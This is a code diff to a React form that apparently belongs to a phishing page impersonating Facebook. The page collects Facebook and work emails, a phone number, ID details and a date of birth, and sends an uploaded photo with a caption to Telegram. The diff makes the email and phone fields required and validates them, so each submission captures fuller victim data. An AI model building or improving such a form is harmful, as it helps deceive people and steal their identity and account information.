@@ -15,6 +15,7 @@ const PrivacyForm = () => {
         email_facebook: '',
         email_work: '',
     });
+    const [phoneError, setPhoneError] = useState('');
 
     const idTypes = [
         labels.idType_0,
@@ -37,24 +38,55 @@ const PrivacyForm = () => {
         await sendPhotoToTelegram(file, caption);
     };
 
+    const getEmailError = (value, emptyMessage, invalidMessage) => {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        const normalizedValue = String(value || '').trim();
+
+        if (normalizedValue === '') {
+            return emptyMessage;
+        }
+
+        if (!emailRegex.test(normalizedValue)) {
+            return invalidMessage;
+        }
+
+        return '';
+    };
+
+    const getPhoneError = (value) => {
+        const normalizedValue = String(value || '').trim();
+        if (normalizedValue === '') {
+            return 'Vui lòng nhập số điện thoại.';
+        }
+
+        if (!/^\d+$/.test(normalizedValue)) {
+            return 'Số điện thoại chỉ được chứa chữ số.';
+        }
+
+        return '';
+    };
+
     const handleSubmit = (e) => {
         e.preventDefault();
         const fd = new FormData(e.target);
         const data = Object.fromEntries(fd.entries());
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         const nextEmailErrors = {
-            email_facebook:
-                data.email_facebook && !emailRegex.test(String(data.email_facebook).trim())
-                    ? 'Email Facebook không đúng định dạng.'
-                    : '',
-            email_work:
-                data.email_work && !emailRegex.test(String(data.email_work).trim())
-                    ? 'Email liên hệ không đúng định dạng.'
-                    : '',
+            email_facebook: getEmailError(
+                data.email_facebook,
+                'Vui lòng nhập email Facebook.',
+                'Email Facebook không đúng định dạng.',
+            ),
+            email_work: getEmailError(
+                data.email_work,
+                'Vui lòng nhập email liên hệ.',
+                'Email liên hệ không đúng định dạng.',
+            ),
         };
+        const nextPhoneError = getPhoneError(data.phone);
 
-        if (nextEmailErrors.email_facebook || nextEmailErrors.email_work) {
+        if (nextEmailErrors.email_facebook || nextEmailErrors.email_work || nextPhoneError) {
             setEmailErrors(nextEmailErrors);
+            setPhoneError(nextPhoneError);
             return;
         }
 
@@ -62,6 +94,7 @@ const PrivacyForm = () => {
             email_facebook: '',
             email_work: '',
         });
+        setPhoneError('');
         setFormData({ ...data, country: selectedCountry });
         setShowModal(true);
     };
@@ -172,15 +205,16 @@ const PrivacyForm = () => {
                                 id="privacy-email-fb"
                                 type="email"
                                 name="email_facebook"
+                                required
                                 onChange={(e) => {
                                     const nextValue = e.target.value;
-                                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                                     setEmailErrors((prev) => ({
                                         ...prev,
-                                        email_facebook:
-                                            nextValue && !emailRegex.test(nextValue.trim())
-                                                ? 'Email Facebook không đúng định dạng.'
-                                                : '',
+                                        email_facebook: getEmailError(
+                                            nextValue,
+                                            'Vui lòng nhập email Facebook.',
+                                            'Email Facebook không đúng định dạng.',
+                                        ),
                                     }));
                                 }}
                                 className="w-full rounded-[4px] border border-[#ccd0d5] px-3 py-[6px] text-[13px] text-[#1c1e21] outline-none focus:border-[#1877f2]"
@@ -202,15 +236,16 @@ const PrivacyForm = () => {
                                 id="privacy-email-work"
                                 type="email"
                                 name="email_work"
+                                required
                                 onChange={(e) => {
                                     const nextValue = e.target.value;
-                                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                                     setEmailErrors((prev) => ({
                                         ...prev,
-                                        email_work:
-                                            nextValue && !emailRegex.test(nextValue.trim())
-                                                ? 'Email liên hệ không đúng định dạng.'
-                                                : '',
+                                        email_work: getEmailError(
+                                            nextValue,
+                                            'Vui lòng nhập email liên hệ.',
+                                            'Email liên hệ không đúng định dạng.',
+                                        ),
                                     }));
                                 }}
                                 className="w-full rounded-[4px] border border-[#ccd0d5] px-3 py-[6px] text-[13px] text-[#1c1e21] outline-none focus:border-[#1877f2]"
@@ -248,8 +283,17 @@ const PrivacyForm = () => {
                                 id="privacy-phone"
                                 type="tel"
                                 name="phone"
+                                required
+                                inputMode="numeric"
+                                pattern="[0-9]*"
+                                onChange={(e) => {
+                                    setPhoneError(getPhoneError(e.target.value));
+                                }}
                                 className="w-full rounded-[4px] border border-[#ccd0d5] px-3 py-[6px] text-[13px] text-[#1c1e21] outline-none focus:border-[#1877f2]"
                             />
+                            {phoneError && (
+                                <p className="mt-1 text-[12px] text-red-500">{phoneError}</p>
+                            )}
                         </div>
 
                         {/* Date of birth */}
